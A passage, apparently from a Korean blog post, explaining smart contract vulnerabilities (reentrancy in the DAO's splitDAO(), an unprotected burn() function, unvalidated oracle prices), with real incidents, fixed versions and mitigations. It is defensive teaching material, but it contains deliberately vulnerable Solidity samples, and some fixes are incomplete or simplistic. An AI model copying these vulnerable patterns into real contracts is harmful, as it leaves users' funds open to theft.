&#xAC80;&#xD1A0;&#xD574;&#xC57C;&#xD560; &#xBCF4;&#xC548; &#xD56D;&#xBAA9;&#xC774; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xC608;&#xC2DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC544;&#xC694;.</p><ul><li>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; &#xC678;&#xBD80; &#xC8FC;&#xC18C; (&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;)&#xB85C; &#xC774;&#xB354;(ETH)&#xB098; &#xD1A0;&#xD070;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74;, &#xC218;&#xC2E0;&#xC790; &#xCABD;&#xC758; &#xD568;&#xC218; (fallback() &#xB610;&#xB294; receive())&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xB54C; &#xADF8; &#xD568;&#xC218; &#xC548;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C;, &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC774; &#xC678;&#xBD80; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</li><li>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xAE30;&#xD68C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB2E4;&#xC2DC; &#xC6D0;&#xB798; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC7AC;&#xD638;&#xCD9C;&#xD558;&#xBA74;, &#xC6D0;&#xB798; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC544;&#xC9C1; &#xC774;&#xC804; &#xD568;&#xC218; &#xC2E4;&#xD589;&#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC0C1;&#xD0DC;&#xAC00; &#xC815;&#xB9AC;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB610; &#xC2E4;&#xD589;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xADF8; &#xACB0;&#xACFC;, &#xC794;&#xC561; &#xAC80;&#xC99D; &#xC774;&#xC804;&#xC5D0; &#xACC4;&#xC18D; &#xC790;&#xAE08;&#xC744; &#xBE7C;&#xB0B4;&#xB294; &#xB4F1;&#xC758; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB294; DAO &#xD574;&#xD0B9; &#xB2F9;&#xC2DC; &#xCDE8;&#xC57D;&#xD588;&#xB358; &#xD568;&#xC218; splitDAO()&#xC758; &#xC77C;&#xBD80;&#xB85C;, &#xC7AC;&#xC9C4;&#xC785; &#xACF5;&#xACA9;&#xC5D0; &#xCDE8;&#xC57D;&#xD588;&#xB358; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">function splitDAO(uint _proposalID, address _newCurator) noEther onlyTokenholders returns (bool _success) {    ...// [1]    uint fundsToBeMoved = (balances[msg.sender] * p.splitData[0].splitBalance) / p.splitData[0].totalSupply;    //Since the balance is never updated the attacker can pass this modifier several times     // [2]    if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false) throw;    ...    // Burn DAO Tokens    // Funds are transferred before the balance is updated    //[3]    Transfer(msg.sender, 0, balances[msg.sender]);    withdrawRewardFor(msg.sender); // be nice, and get his rewards    // Only now after the funds are transferred is the balance updated    totalSupply -= balances[msg.sender];    paidOut[msg.sender] = 0;    return true;}</code></pre><p>splitDAO() &#xD568;&#xC218;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; DAO&#xB97C; &#xD0C8;&#xD1F4;&#xD558;&#xACE0; &#xC0C8;&#xB85C;&#xC6B4; DAO&#xB85C; &#xC774;&#xB3D9;&#xD560; &#xB54C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>[1]&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBC1B;&#xC744; &#xC774;&#xB354; &#xAE08;&#xC561;&#xC778; <code>fundsToBeMoved</code>&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xB294;,. &#xC774; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>balances[msg.sender]</code>&#xB294; &#xC544;&#xC9C1; &#xC904;&#xC5B4;&#xB4E4;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. </p><p>[2]&#xC5D0;&#xC11C; &#xC774;&#xB354;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xBA74;&#xC11C; &#xC678;&#xBD80; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD568;&#xC218;(<code>createTokenProxy</code>)&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;, &#xC774; &#xB54C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB9CC;&#xB4E0; &#xC545;&#xC131; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; splitDAO()&#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xBA74; <code>balances[msg.sender]</code>&#xB294; &#xC5EC;&#xC804;&#xD788; &#xAC12;&#xC774; &#xADF8;&#xB300;&#xB85C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB3D9;&#xC77C;&#xD55C; &#xAE08;&#xC561;&#xC744; &#xC5EC;&#xB7EC; &#xBC88; &#xC694;&#xCCAD;&#xC5D0; &#xC790;&#xAE08;&#xC744; &#xBC18;&#xBCF5;&#xD574;&#xC11C; &#xC778;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB3FC;&#xC694;.</p><p>[3] &#xC774;&#xD6C4;&#xC5D0; &#xB0B4;&#xBD80; &#xC0C1;&#xD0DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xBBF8; &#xC678;&#xBD80; &#xD638;&#xCD9C;&#xC774; &#xB05D;&#xB09C; &#xD6C4;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xBBC0;&#xB85C;, &#xBC29;&#xC5B4;&#xC5D0;&#xB294; &#xC804;&#xD600; &#xD6A8;&#xACFC;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><strong>Mitigation</strong></p><p>1) <strong>Checks-Effects-Interactions &#xD328;&#xD134; &#xC0AC;&#xC6A9;</strong><br>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC678;&#xBD80; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xD558;&#xAE30; &#xC804;&#xC5D0; &#xB0B4;&#xBD80; &#xC0C1;&#xD0DC;&#xB97C; &#xBA3C;&#xC800; &#xBCC0;&#xACBD;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; checks &#x2192; Effects &#x2192; Interaction &#xC21C;&#xC11C;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>Checks: &#xC785;&#xB825;&#xAC12;&#xACFC; &#xC870;&#xAC74; &#xAC80;&#xC99D;</li><li>Effects: &#xC0C1;&#xD0DC; &#xBCC0;&#xC218; &#xC5C5;&#xB370;&#xC774;&#xD2B8;</li><li>Interactions: &#xC678;&#xBD80; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xD638;&#xCD9C;<br>2) <strong>ReentrancyGuard &#xC0AC;&#xC6A9;</strong><br><a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">OpenZeppelin</a>&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; ReentrancyGuard&#xB294; &#xC7AC;&#xC9C4;&#xC785; &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC785;&#xB2C8;&#xB2E4;. <code>nonReentrant</code> modifier&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xBA74;, &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC77C; &#xB54C; &#xB3D9;&#xC77C;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC744; &#xCC28;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h3 id="2-Improper-Access-Control"><a href="#2-Improper-Access-Control" class="headerlink" title="2. Improper Access Control"></a>2. Improper Access Control</h3><p>Access control vulnerability (&#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;)&#xB294; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xAE30;&#xB2A5;&#xC774;&#xB098; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xC744; &#xC801;&#xC808;&#xD558;&#xAC8C; &#xC81C;&#xD55C;&#xD558;&#xC9C0; &#xBABB;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xBBFC;&#xAC10;&#xD55C; &#xAE30;&#xB2A5;(ex. &#xD1A0;&#xD070; &#xBC1C;&#xD589;, &#xC790;&#xC0B0; &#xC778;&#xCD9C;, &#xACC4;&#xC57D; &#xC815;&#xC9C0;, &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC; &#xB4F1;)&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xACC4;&#xC57D;&#xC758; &#xBCF4;&#xC548;&#xC131;&#xACFC; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xC704;&#xD611;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Solidity_AccessControl {    mapping(address =&gt; uint256) public balances;    // Burn function with no access control    function burn(address account, uint256 amount) public {        _burn(account, amount);    }}</code></pre><p>&#xC774; &#xC608;&#xC81C;&#xB294; &#xB204;&#xAD6C;&#xB098; burn &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC544;&#xBB34; &#xC8FC;&#xC18C;&#xC758; &#xD1A0;&#xD070; &#xC794;&#xC561;&#xC744; &#xC904;&#xC774;&#xAC70;&#xB098; &#xD30C;&#xAD34;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xAD8C;&#xD55C; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xBBFC;&#xAC10;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xB178;&#xCD9C;&#xD55C; &#xC804;&#xD615;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB294; onlyOwner modifier&#xB97C; &#xD1B5;&#xD574; &#xC624;&#xC9C1; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xC18C;&#xC720;&#xC790;&#xB9CC; burn&#xC744; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB41C; &#xBC84;&#xC804;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// Import the Ownable contract from OpenZeppelin to manage ownershipimport &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract Solidity_AccessControl is Ownable {    mapping(address =&gt; uint256) public balances;    // Burn function with proper access control, only accessible by the contract owner    function burn(address account, uint256 amount) public onlyOwner {        _burn(account, amount);    }}</code></pre><p><strong>&#xC2E4;&#xC81C; &#xC0AC;&#xB840;</strong></p><ul><li>2017&#xB144; &#xBC1C;&#xC0DD;&#xD55C; Parity Multisig Wallet &#xD574;&#xD0B9;&#xC740; &#xCD08;&#xAE30;&#xD654; &#xD568;&#xC218; <code>initWallet()</code>&#xC5D0; &#xC811;&#xADFC; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC5C8;&#xB358; &#xAC83;&#xC774; &#xC6D0;&#xC778;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC790;&#xC2E0;&#xC744; &#xC9C0;&#xAC11;&#xC758; &#xC18C;&#xC720;&#xC790;&#xB85C; &#xB4F1;&#xB85D;&#xD588;&#xACE0;, &#xC57D; 15&#xB9CC; ETH(&#xB2F9;&#xC2DC; &#xC57D; 3&#xCC9C;&#xB9CC; &#xB2EC;&#xB7EC;)&#xB97C; &#xD0C8;&#xCDE8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><strong>Mitigation</strong></p><p>1) <strong>&#xAD8C;&#xD55C; &#xC81C;&#xC5B4; &#xBAA8;&#xB4C8; &#xC0AC;&#xC6A9;</strong><br>OpenZeppelin&#xC758; <a href="https://docs.openzeppelin.com/contracts/2.x/api/ownership#Ownable"><code>Ownable</code></a>, <code>AccessControl</code>, <code>RBAC</code>(Role-Based Access Control) &#xAC19;&#xC740; &#xAC80;&#xC99D;&#xB41C; &#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.<br>2) <strong>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xB0B4;&#xC5D0; &#xBA85;&#xD655;&#xD558;&#xACE0; &#xCCB4;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC124;&#xACC4;&#xD558;&#xACE0; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</strong></p><h3 id="3-Price-oracle-manipulation"><a href="#3-Price-oracle-manipulation" class="headerlink" title="3. Price oracle manipulation"></a>3. <strong>Price oracle manipulation</strong></h3><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC678;&#xBD80;&#xB85C;&#xBD80;&#xD130; &#xAC00;&#xACA9;&#xC774;&#xB098; &#xAE30;&#xD0C0; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xB54C; &#xC624;&#xB77C;&#xD074;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; DeFi&#xC5D0;&#xC11C; &#xC790;&#xC0B0; &#xAC00;&#xACA9;&#xC744; &#xAC00;&#xC838;&#xC624;&#xAE30; &#xC704;&#xD574; &#xC624;&#xB77C;&#xD074;&#xC744; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC774; &#xC624;&#xB77C;&#xD074;&#xC774; &#xC870;&#xC791;&#xB418;&#xAC70;&#xB098;, &#xCDE8;&#xC57D;&#xD558;&#xAC70;&#xB098;, &#xC2E0;&#xB8B0;&#xC131;&#xC774; &#xBD80;&#xC871;&#xD558;&#xB2E4;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xAC70;&#xC9D3; &#xAC00;&#xACA9; &#xC815;&#xBCF4;&#xB97C; &#xC8FC;&#xC785;&#xD574; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xC798;&#xBABB;&#xB41C; &#xB3D9;&#xC791;&#xC744; &#xC720;&#xBC1C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBB34;&#xB2E8; &#xC778;&#xCD9C;, &#xACFC;&#xB3C4;&#xD55C; &#xB808;&#xBC84;&#xB9AC;&#xC9C0;, &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xD30C;&#xC0B0;, &#xC720;&#xB3D9;&#xC131; &#xD480; &#xACE0;&#xAC08; &#xB4F1;&#xC758; &#xD53C;&#xD574;&#xB97C; &#xC77C;&#xC73C;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xC608;&#xC2DC;&#xB294; &#xAC1C;&#xB150;&#xC744; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC791;&#xC131;&#xB41C; &#xC0D8;&#xD50C; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// [1]interface IPriceFeed {    function getLatestPrice() external view returns (int);}contract PriceOracleManipulation {    address public owner;    IPriceFeed public priceFeed;    constructor(address _priceFeed) {        owner = msg.sender;        priceFeed = IPriceFeed(_priceFeed);    }// [2]    function borrow(uint256 amount) public {        int price = priceFeed.getLatestPrice();        require(price &gt; 0, &quot;Price must be positive&quot;);        // Vulnerability: No validation or protection against price manipulation        //[3]        uint256 collateralValue = uint256(price) * amount;        // Borrow logic based on manipulated price        // If an attacker manipulates the oracle, they could borrow more than they should    }    function repay(uint256 amount) public {        // Repayment logic    }}</code></pre><p>[1]&#xC758; getLatestPrice() &#xD568;&#xC218;&#xB85C; &#xC678;&#xBD80; &#xC2DC;&#xC2A4;&#xD15C;(&#xC624;&#xB77C;&#xD074;)&#xC5D0;&#xC11C; &#xCD5C;&#xC2E0; &#xAC00;&#xACA9;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xC774; &#xC624;&#xB77C;&#xD074;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAC70;&#xB098; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB2E4;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD5C8;&#xC704; &#xAC00;&#xACA9; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0; &#xC8FC;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[2]&#xB85C; borrow()&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C;, &#xC624;&#xB77C;&#xD074;&#xB85C;&#xBD80;&#xD130; &#xC790;&#xC0B0;&#xC758; &#xD604;&#xC7AC; &#xAC00;&#xACA9;&#xC744; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;. price &gt; 0 &#xC870;&#xAC74;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xACE0;, &#xC870;&#xC791;&#xB41C; &#xAC00;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xBC29;&#xC5B4;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC5D0;&#xC11C;&#xB294; &#xBC1B;&#xC544;&#xC628; &#xAC00;&#xACA9; &#xAC12;&#xACFC; amount&#xB97C; &#xACF1;&#xD574;&#xC11C; &#xB2F4;&#xBCF4; &#xAC00;&#xCE58;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294;&#xB370;, &#xC774; &#xAC12;&#xC774; &#xACFC;&#xB300;&#xD3C9;&#xAC00;&#xB418;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC2E4;&#xC81C;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xC790;&#xAE08;&#xC744; &#xBE4C;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD5C8;&#xC704; &#xAC00;&#xACA9; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xC785;&#xD588;&#xB2E4;&#xBA74;, &#xB2F4;&#xBCF4; &#xB300;&#xBE44; &#xCD08;&#xACFC; &#xB300;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC2DC;&#xC2A4;&#xD15C; &#xC790;&#xC0B0; &#xC720;&#xCD9C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; &#xC55E;&#xC11C; &#xBCF4;&#xC5EC;&#xC900; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xBCF4;&#xC644;&#xD55C; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IPriceFeed {    function getLatestPrice() external view returns (int);}contract PriceOracleManipulation {    address public owner;    IPriceFeed public priceFeed;    // [1]    int public minPrice = 1000; // Set minimum acceptable price    int public maxPrice = 2000; // Set maximum acceptable price    constructor(address _priceFeed) {        owner = msg.sender;        priceFeed = IPriceFeed(_priceFeed);    }    function borrow(uint256 amount) public {        int price = priceFeed.getLatestPrice();        // [2]        require(price &gt; 0 &amp;&amp; price &gt;= minPrice &amp;&amp; price &lt;= maxPrice, &quot;Price manipulation detected&quot;);        uint256 collateralValue = uint256(price) * amount;        // Borrow logic based on valid price    }    function repay(uint256 amount) public {        // Repayment logic    }}</code></pre><p>[1] &#xAC00;&#xACA9; &#xC870;&#xC791;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAE30;&#xC900;&#xAC12; &#xBCC0;&#xC218;&#xB97C; &#xC815;&#xD558;&#xACE0; [2] &#xAC00;&#xACA9; &#xAC80;&#xC99D;&#xC744; &#xC704;&#xD55C; &#xB85C;&#xC9C1;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC2E4;&#xC81C; &#xC0AC;&#xB840;</strong></p><ul><li>2023&#xB144; 2&#xC6D4; BonqDAO &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0; &#xC624;&#xB77C;&#xD074; &#xC870;&#xC791; &#xACF5;&#xACA9;&#xC774; &#xBC1C;&#xC0DD;&#xD574; 1&#xC5B5; 2&#xCC9C;&#xB9CC; &#xB2EC;&#xB7EC;&#xC758; &#xC190;&#xC2E4;&#xC744; &#xC785;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC624;&#xB77C;&#xD074;&#xC744; &#xD1B5;&#xD574; ALBT &#xD1A0;&#xD070; &#xAC00;&#xACA9;&#xC744; &#xC778;&#xC704;&#xC801;&#xC73C;&#xB85C; &#xBD80;&#xD480;&#xB9AC;&#xACE0;, &#xC774;&#xB97C; &#xB2F4;&#xBCF4;&#xB85C; BEUR &#xC2A4;&#xD14C;&#xC774;&#xBE14; &#xCF54;&#xC778;&#xC744; &#xACFC;&#xB3C4;&#xD558;&#xAC8C; &#xBC1C;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACF5;&#xACA9;&#xC758; &#xC6D0;&#xC778;&#xC740; &#xC624;&#xB77C;&#xD074; &#xAC00;&#xACA9; &#xAC80;&#xC99D; &#xBD80;&#xC7AC;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>2023&#xB144; 5&#xC6D4; Baby Doge &#xD1A0;&#xD070;&#xC774; &#xC624;&#xB77C;&#xD074; &#xC870;&#xC791; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC57D; 13&#xB9CC; 7&#xCC9C; &#xB2EC;&#xB7EC; &#xC0C1;&#xB2F9;&#xC758; &#xD53C;&#xD574;&#xB97C; &#xC785;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><strong>mitigation</strong></p><ul><li>&#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xB3C5;&#xB9BD;&#xC801;&#xC778; &#xC624;&#xB77C;&#xD074;&#xB85C;&#xBD80;&#xD130; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC9D1;&#xACC4;&#xD558;&#xBA74; &#xC870;&#xC791; &#xC704;&#xD5D8;&#xC744; &#xC904;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xB85C;&#xC9C1;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xB294; &#xAE09;&#xACA9;&#xD55C; &#xAC00;&#xACA9; &#xBCC0;&#xB3D9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xC624;&#xB77C;&#xD074;&#xB85C;&#xBD80;&#xD130; &#xBC1B;&#xC740; &#xAC00;&#xACA9;&#xC5D0; &#xCD5C;&#xC18C;&#xAC12; &#xBC0F; &#xCD5C;&#xB300;&#xAC12; &#xC784;&#xACC4; &#xC870;&#xAC74;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD0C0;&#xC784;&#xB77D;(time lock)&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC;, &#xAC00;&#xACA9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC0AC;&#xC774;&#xC5D0; &#xC9C0;&#xC5F0;&#xC744; &#xB450;&#xBA74; &#xC989;&#xAC01;&#xC801;&#xC778; &#xAC00;&#xACA9; &#xBCC0;&#xB3D9;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC624;&#xB77C;&#xD074;&#xB85C;&#xBD80;&#xD130; &#xBC1B;&#xC740; &#xB370;&#xC774;&#xD130;&#xC758; &#xC2E0;&#xB8B0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xC554;&#xD638;&#xD559;&#xC801; &#xC11C;&#xBA85; &#xB4F1; &#xC99D;&#xBA85; &#xBC29;&#xC2DD;&#xC744; &#xD65C;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xAC1C;&#xB150;&#xACFC; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;, &#xADF8;&#xB9AC;&#xACE0; &#xB300;&#xD45C;&#xC801;&#xC778; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810; &#xBA87; &#xAC00;&#xC9C0;&#xB97C; &#xB2E4;&#xB918;&#xC5B4;&#xC694;. &#xC0AC;&#xC2E4; &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xC2A4;&#xB9C8;&#xD2B8; 